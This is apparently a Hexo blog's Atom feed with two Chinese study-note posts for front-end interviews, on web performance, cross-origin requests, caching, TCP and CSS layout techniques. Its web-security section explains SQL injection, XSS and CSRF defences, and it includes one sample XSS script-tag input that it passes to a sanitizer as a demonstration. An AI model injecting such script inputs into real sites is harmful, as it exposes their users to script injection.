<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Gzzzh</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://gzzzzh.github.io/"/>
  <updated>2019-09-06T10:41:13.316Z</updated>
  <id>https://gzzzzh.github.io/</id>
  
  <author>
    <name>Gzzzh</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>综合知识点</title>
    <link href="https://gzzzzh.github.io/2019/09/06/%E7%BB%BC%E5%90%88%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <id>https://gzzzzh.github.io/2019/09/06/综合知识点/</id>
    <published>2019-09-06T10:39:14.000Z</published>
    <updated>2019-09-06T10:41:13.316Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章会记录我的一些综合知识点笔记，方便自己进行复习，长期施工…<br><a id="more"></a></p><h2 id="前端性能优化"><a href="#前端性能优化" class="headerlink" title="前端性能优化"></a>前端性能优化</h2><p>参考雅虎前端性能优化</p><ol><li>最小化HTTP请求</li><li>减少DNS查找</li><li>避免重定向</li><li>使Ajax可缓存</li><li>延迟加载组件</li><li>预加载组件</li><li>减少DOM的数量</li><li>跨域拆分组件</li><li>最少的iframe</li><li>不要出现404</li><li>使用CDN</li><li>添加Expries或者Cache-Control头</li><li>Gzip组件压缩文件</li><li>配置ETag</li><li>Ajax尽量使用get请求</li><li>避免空src的img标签</li><li>减少cookie的大小</li><li>将CSS放在顶部(文档的HEAD)</li><li>避免CSS表达式</li><li>选择<link>而不是@import</li><li>将Script放在body的底部</li><li>使用外部的JS和CSS</li><li>压缩JS和CSS</li><li>删除重复的脚本</li><li>最小化DOM访问</li><li>用DOMContentLoaded代替onload</li><li>优化图片</li><li>不要在HTML中缩放图片</li><li>favicon.ico小且可缓存</li></ol><h2 id="跨域问题产生和解决"><a href="#跨域问题产生和解决" class="headerlink" title="跨域问题产生和解决"></a>跨域问题产生和解决</h2><p>由于浏览器的同源策略，再出现域名端口协议有一种不一致时，就会出现跨域，属于浏览器的一种安全限制。</p><h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><p>同源策略指协议，端口，域名相同</p><h3 id="为什么要有同源策略"><a href="#为什么要有同源策略" class="headerlink" title="为什么要有同源策略"></a>为什么要有同源策略</h3><p>设置同源策略主要目的是为了安全，如果没有同源策略，浏览器中的cookie及其他数据可以任意获取，不同域下的dom可以任意操作，ajax任意请求其他网站的数据，包括隐私数据</p><h3 id="常用解决办法"><a href="#常用解决办法" class="headerlink" title="常用解决办法"></a>常用解决办法</h3><h4 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h4><p>动态创建一个script，再请求一个带参网址实现跨域通信。缺点是只能实现get一种请求<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> script = <span class="built_in">document</span>.creatElement(<span class="string">'script'</span>)</span><br><span class="line">script.type = <span class="string">'text/javascript'</span></span><br><span class="line">script.src = script.src = <span class="string">'http://www.....:8080/login?user=admin&amp;callback=onBack'</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onBack</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.parse(res))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="CORS-跨域资源共享"><a href="#CORS-跨域资源共享" class="headerlink" title="CORS(跨域资源共享)"></a>CORS(跨域资源共享)</h3><p>只需要在服务器端设置Access-Control-Allow-Origin，前端无需设置，他的值要么是*，要么是请求时origin的值，表示允许所有域名或者指定域名进行请求</p><h3 id="nginx-反向代理接口跨域"><a href="#nginx-反向代理接口跨域" class="headerlink" title="nginx(反向代理接口跨域)"></a>nginx(反向代理接口跨域)</h3><p>同源策略是浏览器的安全策略，不是http协议的一部分。服务器调用HTTP接口只是使用HTTP协议，不会执行JS脚本，不需要同源策略，也就不存在跨域问题</p><h2 id="XML和JSON的区别"><a href="#XML和JSON的区别" class="headerlink" title="XML和JSON的区别"></a>XML和JSON的区别</h2><p>JSON比XML体积要小；JSON比XML更容易解析处理；JSON对数据的描述较差；JSON传输速度要更快</p><h2 id="常见web安全及防护原理"><a href="#常见web安全及防护原理" class="headerlink" title="常见web安全及防护原理"></a>常见web安全及防护原理</h2><h3 id="sql注入攻击"><a href="#sql注入攻击" class="headerlink" title="sql注入攻击"></a>sql注入攻击</h3><p>就是通过sql命令插入到web表单递交或者输入域名或页面的请求字符串，最终达到欺骗服务器执行的恶意sql命令</p><ol><li>永远不要信任用户的输入，要对用户的输入进行校验</li><li>永远不要使用动态拼装sql</li><li>不要把机密信息明文存放，把重要敏感内容加密或者hash</li></ol><h3 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h3><p>Xss(cross-site scripting)攻击指的是攻击者往Web页面里插入恶意html标签或者javascript代码</p><p>首先代码里对用户输入的地方和变量都需要仔细检查长度和对”&lt;”,”&gt;”,”;”,”’”等字符做过滤；其次任何内容写到页面之前都必须加以encode，避免不小心把html tag 弄出来。</p><p>可以使用js-xss插件会帮我们进行转义<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xss = <span class="built_in">require</span>(<span class="string">"xss"</span>);</span><br><span class="line"><span class="keyword">var</span> html = xss(<span class="string">'&lt;h1 id="title"&gt;XSS Demo&lt;/h1&gt;&lt;script&gt;alert("xss");&lt;/script&gt;'</span>);</span><br><span class="line"><span class="comment">// -&gt; &lt;h1&gt;XSS Demo&lt;/h1&gt;&amp;lt;script&amp;gt;alert("xss");&amp;lt;/script&amp;gt;</span></span><br><span class="line"><span class="built_in">console</span>.log(html);</span><br></pre></td></tr></table></figure></p><h3 id="sorf"><a href="#sorf" class="headerlink" title="sorf"></a>sorf</h3><p>CSRF是代替用户完成指定的动作，需要知道其他用户页面的代码和数据包。要完成一次CSRF攻击，受害者必须依次完成两个步骤</p><p>登录受信任网站A，并在本地生成Cookie</p><p>在不登出A的情况下，访问危险网站B</p><p>点击B网站的某个链接对A发请求带上了cookie等信息，链接中包含了一些恶意代码</p><p> CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p><h3 id="密码安全"><a href="#密码安全" class="headerlink" title="密码安全"></a>密码安全</h3><p>可以给密码进行加盐，在进行几次不同加密算法的加密。但这种做法不能防止别人盗号，只能防止泄漏用户真实的密码。对于暴力破解密码，可以使用验证码进行拖延或者限制次数</p><h2 id="浏览器缓存"><a href="#浏览器缓存" class="headerlink" title="浏览器缓存"></a>浏览器缓存</h2><p>浏览器缓存分为两种，一种是强缓存，一种是协商缓存</p><h3 id="获取缓存流程"><a href="#获取缓存流程" class="headerlink" title="获取缓存流程"></a>获取缓存流程</h3><ul><li>先根据资源的http header判断是否命中强缓存，如果命中，则直接从本地获取缓存资源，不会发请求到服务器</li><li>当强缓存没有命中时，客户端会发请求到服务器，服务器通过另一些request header验证这个资源是否命中协商缓存，称为http再验证，如果命中，服务器将请求返回，告知客户端直接从缓存获取，客户端收到返回后就从缓存获取资源</li><li>强缓存和协商缓存的共同之处在于，命中缓存的时候，服务器都不会返回资源，区别是协商缓存会发送请求到服务器，而强缓存不会</li><li>当协商缓存也没命中时，服务器会返回资源给客户端</li><li>当ctrl+f5强制刷新网页，会跳过强缓存和协商缓存，从服务器加载</li><li>当f5刷新网页时会跳过强缓存，但协商缓存无法跳过</li></ul><h4 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h4><p>强制缓存的过期时间通过第一次访问服务器时返回的响应头获取。在 http 1.0 和 http 1.1 版本中通过不同的响应头字段实现</p><ul><li>1.0 Expires表示资源过期时间，当发起的请求时间超过设定时间，代表资源过期，会发送请求到服务器获取资源</li><li>1.1 Cache-Control:max-age表示资源最大生命周期，单位是秒，一般来说会两种一起使用</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>强制缓存只有在首次请求才会跟服务器通信，读取缓存不会发出任何请求，资源的状态码为200，资源的size为from memory 或者 from disk，http1.1的优先级最高</p><h4 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h4><p>协商缓存每次读取数据时都会发送请求到服务器，第一次的时候会返回资源和一个缓存标识，之后会带上这个缓存标识去匹配，匹配成功就返回304，缓存命中。</p><ul><li>1.0 </li></ul><ol><li>Last-Modified为资源最后更新时间，随着服务器response返回</li><li>If-Modified-Since为前一次接受的Last-Modified，随请求头发送出去，如果这个值和服务器的值一致，则命中缓存，返回304，客户端从本地缓存获取资源。如果不一致，会返回新的资源和新的Last-Modified</li></ol><p>但这个方法有个弊端，当资源在服务端有过修改但是最终内容不变，因为修改时间变了，还是会重新获取资源</p><ul><li>1.1</li></ul><ol><li>ETag，表示资源的唯一表示，随着服务器response返回</li><li>If-None-Match，表示前一次接受的ETag，随着请求头发送出去，如果这个值和服务器的值一致，则命中缓存，返回304，客户端从本地缓存获取资源。如果不一致，代表资源内容有过修改，会返回新的资源和新的ETag</li></ol><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>协商缓存每次请求都会与服务器交互，第一次是拿数据和标识的过程，第二次开始，就是浏览器询问服务器资源是否有更新的过程。每次请求都会传输数据，如果命中缓存，则资源的 Status 状态码为 304 而不是 200 。同样的，一般来讲为了兼容，两个版本的协商缓存都会被实现，http 1.1 版本的实现优先级会高于 http 1.0 版本的实现。</p><h2 id="输入URL到页面展示的过程"><a href="#输入URL到页面展示的过程" class="headerlink" title="输入URL到页面展示的过程"></a>输入URL到页面展示的过程</h2><h3 id="输入url"><a href="#输入url" class="headerlink" title="输入url"></a>输入url</h3><p>浏览器会从缓存，收藏夹等地方给你智能补全url</p><h3 id="浏览器缓存-1"><a href="#浏览器缓存-1" class="headerlink" title="浏览器缓存"></a>浏览器缓存</h3><p>查看是否命中强缓存</p><h3 id="DNS查找"><a href="#DNS查找" class="headerlink" title="DNS查找"></a>DNS查找</h3><ol><li>从浏览器缓存查找</li><li>从操作系统缓存中查找</li><li>从本地硬盘的hosts文件查找，看看有没有和这个域名对应的规则，有则使用对应的ip地址</li><li>如果本地hosts没有对应，则发出一个DNS请求到本地DNS服务器，一般由网络服务商提供</li><li>当局部DNS服务器自己不能回答客户机的DNS查询时，它就需要向其他DNS服务器进行查询。此时有两种方式，如图所示的是递归方式。局部DNS服务器自己负责向其他DNS服务器进行查询，一般是先向该域名的根域服务器查询，再由根域名服务器一级级向下查询。最后得到的查询结果返回给局部DNS服务器，再由局部DNS服务器返回给客户端。</li><li>当局部DNS服务器自己不能回答客户机的DNS查询时，也可以通过迭代查询的方式进行解析，如图所示。局部DNS服务器不是自己向其他DNS服务器进行查询，而是把能解析该域名的其他DNS服务器的IP地址返回给客户端DNS程序，客户端DNS程序再继续向这些DNS服务器进行查询，直到得到查询结果为止。</li></ol><h3 id="建立http链接"><a href="#建立http链接" class="headerlink" title="建立http链接"></a>建立http链接</h3><p>建立TCP链接需要进行三次握手</p><ol><li>客户端发起链接请求报文给服务端，等待服务端确认，此时进入同步已发送状态</li><li>服务端接收到请求报文后，如果同意链接则返回确认报文，此时服务器进程进入同步收到状态</li><li>客户端收到确认报文后，也向服务端发出确认报文，此时TCP链接已经建立，客户端进入已连接状态，等服务端接收到确认报文后也进入已连接状态，此时可以开始通信</li></ol><h4 id="为什么需要进行三次握手"><a href="#为什么需要进行三次握手" class="headerlink" title="为什么需要进行三次握手"></a>为什么需要进行三次握手</h4><p>计网上写着，是为了防止失效的连接请求报文突然传到服务端因而产生错误。</p><p>当如果是两次握手时候，客户端发送出一个连接请求报文因为某种原因停滞而延误到达服务端，这本是一个失效的报文，但是服务端误以为是一个新的请求报文，于是发出了确认连接报文。由于客户端此时没有发起连接请求，于是无视了确认报文也不会传送数据，而服务端一直在等待着客户端发送数据，白白浪费了需对资源。三次握手主要是防止服务端一直在等待，浪费资源。</p><h3 id="解析请求头"><a href="#解析请求头" class="headerlink" title="解析请求头"></a>解析请求头</h3><p>判断是否有协商缓存的信息和是否命中协商缓存，命中了返回304状态码</p><h3 id="HTTP响应"><a href="#HTTP响应" class="headerlink" title="HTTP响应"></a>HTTP响应</h3><p>传输完成后会断开TCP连接，需要四次挥手</p><ol><li>客户端主动发起连接释放报文，停止发送数据</li><li>服务端收到连接释放报文后，发出确认报文，此时还可以向客户端发送数据</li><li>当最后的数据发送完毕后，服务端会发送连接释放报文</li><li>客户端收到释放报文后发出确认报文</li><li>服务端收到确认报文后立即关闭连接</li><li>客户端发出确认报文后等待2*MSL(最长报文段寿命)才关闭连接</li></ol><h4 id="为什么需要进行四次挥手"><a href="#为什么需要进行四次挥手" class="headerlink" title="为什么需要进行四次挥手"></a>为什么需要进行四次挥手</h4><p>因为TCP是全双工通道，客户端先发送连接释放报文到服务端，再收到返回来的确认报文后只是断开了客户端到服务端这一方向的通道，服务端还是可以传送数据给客户端。当服务端剩下的数据传送完毕后再发送连接释放报文，再收到返回的确认报文后才断开服务端到客户端这一边的连接</p><h3 id="处理响应数据"><a href="#处理响应数据" class="headerlink" title="处理响应数据"></a>处理响应数据</h3><ol><li>解析HTML文档构建DOM树</li><li>构建CSSOM树</li><li>根据DOM树和CSSOM树构建渲染树，从根节点开始遍历DOM树的可见节点，不可见的为displaynone和meta，script等。对于每个节点都在CSSOM树种找到对应的规则并应用</li></ol><h3 id="js解析"><a href="#js解析" class="headerlink" title="js解析"></a>js解析</h3>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这篇文章会记录我的一些综合知识点笔记，方便自己进行复习，长期施工…&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="面试题" scheme="https://gzzzzh.github.io/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>CSS知识点</title>
    <link href="https://gzzzzh.github.io/2019/09/06/CSS%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <id>https://gzzzzh.github.io/2019/09/06/CSS知识点/</id>
    <published>2019-09-06T10:13:31.000Z</published>
    <updated>2019-09-06T10:27:49.664Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章会记录我的一些css知识点笔记，方便自己进行复习，长期施工…<br><a id="more"></a></p><h2 id="重排和重绘"><a href="#重排和重绘" class="headerlink" title="重排和重绘"></a>重排和重绘</h2><p>当DOM变化影响了元素的其他属性(宽和高)，浏览器需要重新计算元素的几何属性，同样其他元素的几何属性和位置也会因此受到影响。浏览器会使渲染树中受到影响的部分失效，并且重新构造渲染树，这个过程称为重排。完成重排后，浏览器会重新绘制受影响的部分到屏幕，该过程称为重绘。</p><p>并不是所有DOM变化都会影响几何属性，每次重排必定有重绘，每次重绘不一定有重排</p><h3 id="重排的原因"><a href="#重排的原因" class="headerlink" title="重排的原因"></a>重排的原因</h3><ol><li>添加或者删除可见DOM元素</li><li>元素位置改变</li><li>元素尺寸改变</li><li>元素内容改变(一个文本被另一个不同尺寸的图片代替)</li><li>页面渲染初始化(无法避免)</li><li>浏览器窗口尺寸改变</li><li>获取offset，scroll，client，getComputedStyle</li><li>改变字体大小</li><li>激活css伪类，设置style属性</li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>尽量不要在布局信息时做查询（会导致渲染队列强制刷新）</li><li>使用class一次性改变属性</li><li>如果要批量添加dom，可以让元素脱离文档流，操作完后在带入文档流，这样触发一次重排</li><li>将需要多次重排的元素设置为绝对定位和固定定位，脱离文档流变化不会影响到其他元素，例如动画，过渡</li></ol><h2 id="BFC-块级格式化上下文"><a href="#BFC-块级格式化上下文" class="headerlink" title="BFC(块级格式化上下文)"></a>BFC(块级格式化上下文)</h2><p>BFC是Web页面中盒模型布局的CSS渲染模式，指一个独立的渲染区域或者说是一个隔离的独立容器</p><h3 id="形成BFC的条件"><a href="#形成BFC的条件" class="headerlink" title="形成BFC的条件"></a>形成BFC的条件</h3><ul><li>浮动元素，float除nono以外的值</li><li>定位元素，position(absolute，fixed)</li><li>display为一下其中一个：inline-block，tabel-cell，tabel-caption</li><li>overflow除了visible以外的值（scroll，auto，hidden）</li></ul><h3 id="BFC的特性"><a href="#BFC的特性" class="headerlink" title="BFC的特性"></a>BFC的特性</h3><ul><li>内部的box会在垂直方向上一个接一个的位置</li><li>垂直方向上的距离由margin决定，解决margin合并和塌陷</li><li>bfc的区域不会与float元素区域重叠</li><li>计算bfc高度时，浮动元素也参与计算</li><li>bfc就是页面上一个独立容器，容器里面的子元素不会影响到外面元素<h2 id="link和-import的区别"><a href="#link和-import的区别" class="headerlink" title="link和@import的区别"></a>link和@import的区别</h2></li></ul><ol><li>link是XHTML标签，除了加载CSS还可以加载RSS等其他事务，而@import只能加载CSS</li><li>link引用CSS时，在页面载入时同时加载，@import需要页面完全载入以后加载</li><li>link是XHTML标签，无兼容问题，@import在IE5以上才能用</li><li>link支持使用js控制dom去改变样式，而@import不支持</li></ol><h2 id="清除浮动"><a href="#清除浮动" class="headerlink" title="清除浮动"></a>清除浮动</h2><p>浮动元素的父元素高度自适应时，父元素高度会发生塌陷。此时需要清除浮动</p><h3 id="清除浮动的方法"><a href="#清除浮动的方法" class="headerlink" title="清除浮动的方法"></a>清除浮动的方法</h3><ul><li>给父元素设置高度</li><li>父元素同时浮动</li><li>父元素设置成display:inline-block</li><li>给父元素添加overflow:hidden</li><li>使用after伪类(万能)<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>:block;</span><br><span class="line">    <span class="attribute">content</span>:<span class="string">''</span>;</span><br><span class="line">    <span class="attribute">clear</span>:both</span><br><span class="line">&#125;</span><br><span class="line">.clearfix&#123; //ie6,7</span><br><span class="line">    <span class="selector-tag">zoom</span><span class="selector-pseudo">:1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="垂直居中"><a href="#垂直居中" class="headerlink" title="垂直居中"></a>垂直居中</h2><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.box1&#123;</span><br><span class="line">    width: 500px;</span><br><span class="line">    height: 500px;</span><br><span class="line">    border: 1px solid black;</span><br><span class="line">    margin: 0 auto;</span><br><span class="line">    &#125;</span><br><span class="line">.box2&#123;</span><br><span class="line">    width: 100px;</span><br><span class="line">    height: 100px;</span><br><span class="line">    background-color: red;</span><br><span class="line">    border-radius: 50%;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box2"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 用到text-align --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;img class="box2" src="https://gw.alipayobjects.com/zos/rmsportal/XuVpGqBFxXplzvLjJBZB.svg" alt=""&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ol><li>text-align实现水平居中这只能对图片，按钮，文字等行内元素才能有效</li><li>行内元素设置margin和padding的left，right有效，top，bottom无效<h3 id="1-flex实现"><a href="#1-flex实现" class="headerlink" title="1.flex实现"></a>1.flex实现</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box1</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">justify-content</span>: center;  <span class="comment">/* 主轴方向居中  */</span> </span><br><span class="line">    <span class="attribute">align-items</span>: center;    <span class="comment">/* 侧轴方向居中 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>还可以用margin进行自动垂直居中<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box1</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.box2</span>&#123;</span><br><span class="line">    <span class="attribute">margin</span>: auto</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="2-display-table-cell"><a href="#2-display-table-cell" class="headerlink" title="2.display:table-cell"></a>2.display:table-cell</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box1</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: table-cell; <span class="comment">/* 使其类似成一个td */</span></span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">vertical-align</span>: middle;<span class="comment">/* 行内元素的垂直方向设置，middle是放在父元素中部 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-translate"><a href="#3-translate" class="headerlink" title="3.translate"></a>3.translate</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box1</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.box2</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate</span>(-50%,-50%) <span class="comment">/* 将中心点往box2的中心点偏移 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-绝对定位和负边距"><a href="#4-绝对定位和负边距" class="headerlink" title="4. 绝对定位和负边距"></a>4. 绝对定位和负边距</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box3</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>:relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.box2</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">top</span>:<span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">left</span>:<span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>:-<span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">margin-top</span>:-<span class="number">25px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现起来和第三个类似</p><h3 id="5-绝对定位和0"><a href="#5-绝对定位和0" class="headerlink" title="5.绝对定位和0"></a>5.绝对定位和0</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box1</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.box2</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">margin</span>: auto</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内部元素要设置宽高，可以是百分比，适合移动端</p><h3 id="6-webkit-box"><a href="#6-webkit-box" class="headerlink" title="6.-webkit-box"></a>6.-webkit-box</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box1</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: -webkit-box;</span><br><span class="line">    <span class="attribute">-webkit-box-pack</span>:center; <span class="comment">/* 水平方向居中 */</span></span><br><span class="line">    <span class="attribute">-webkit-box-align</span>:center;   <span class="comment">/* 垂直方向居中 */</span></span><br><span class="line">    <span class="attribute">-webkit-box-orient</span>: horizontal; <span class="comment">/* 子容器的放置方式，这里用vertical也可以 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>box-flex是css3新添加的盒子模型属性,实现布局的垂直登高/水平均分/按比例划分.兼容性有待提高,没有得到完全支持,可以使用它们的私有属性定义Firefox(-moz)/opera(-o)/chrome/safari(-webkit）</p><h2 id="圣杯布局"><a href="#圣杯布局" class="headerlink" title="圣杯布局"></a>圣杯布局</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span 